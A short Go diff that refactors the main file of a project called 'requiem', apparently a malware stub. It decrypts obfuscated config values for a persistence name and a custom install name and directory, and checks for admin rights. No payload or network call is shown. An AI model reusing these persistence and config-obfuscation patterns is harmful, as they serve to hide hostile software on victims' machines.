@@ -14,7 +14,7 @@ import (
 	"requiem/store"
 	"requiem/utils"
 
-	"shared/higher"
+	"shared"
 )
 
 const DELETE_OLD_FILE_MAX_RETRIES int = 20
@@ -27,10 +27,14 @@ func main() {
 
 	defer utils.RemoveMutex()
 
-	higher.InitKey(store.CRYPTO_KEY_1, store.CRYPTO_KEY_2)
+	if store.DEBUG_MODE {
+		shared.SetLogFunction(utils.DebugLog)
+	}
+
+	shared.InitKey(store.CRYPTO_KEY_1, store.CRYPTO_KEY_2)
 
 	store.InitState()
-	store.DecryptedPersistenceName = higher.DecryptConfig(store.PERSISTENCE_NAME)
+	store.DecryptedPersistenceName = shared.DecryptConfig(store.PERSISTENCE_NAME)
 
 	utils.DebugLog("\n")
 
@@ -92,7 +96,7 @@ func main() {
 	if store.USE_RANDOM_NAME {
 
 	} else if store.USE_CUSTOM_NAME {
-		newName = higher.DecryptConfig(store.CUSTOM_NAME)
+		newName = shared.DecryptConfig(store.CUSTOM_NAME)
 		newName = utils.CleanPath(newName)
 	} else {
 		newName = "_" + filepath.Base(store.ExecPath)
@@ -101,7 +105,7 @@ func main() {
 	if store.USE_RANDOM_DIR {
 
 	} else if store.USE_CUSTOM_DIR {
-		newDir = higher.DecryptConfig(store.CUSTOM_DIR)
+		newDir = shared.DecryptConfig(store.CUSTOM_DIR)
 		newDir = utils.ParsePath(newDir)
 	} else {
 		if store.IsAdmin {
